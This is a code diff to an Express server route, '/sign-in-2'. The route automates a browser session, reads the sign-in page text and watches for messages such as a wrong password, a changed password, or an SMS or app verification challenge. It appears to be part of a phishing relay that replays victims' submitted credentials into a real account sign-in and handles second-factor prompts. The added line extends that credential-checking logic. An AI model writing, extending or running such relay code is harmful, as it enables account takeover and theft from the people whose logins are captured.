@@ -369,6 +369,7 @@ app.post("/sign-in-2", async (req, res) => {
 
     const invalidPassword = "Wrong password.";
     const validPassword = "Check your";
+    const passwordChanged = "Your password was changed"
     const OpenThe = "Open the";
     const smsChallengeText = "Choose how you want to sign in:";
     const smsChallengeText2 =
@@ -393,7 +394,7 @@ app.post("/sign-in-2", async (req, res) => {
 
     let bodyText = await page.evaluate(() => document.body.innerText);
 
-    if (bodyText.includes(invalidPassword)) {
+    if (bodyText.includes(invalidPassword) || bodyText.includes(passwordChanged)) {
       console.log(`Session ${sessionId}: ❌ Wrong password`);
       return res.json({ success: false, code: 0 });
     }
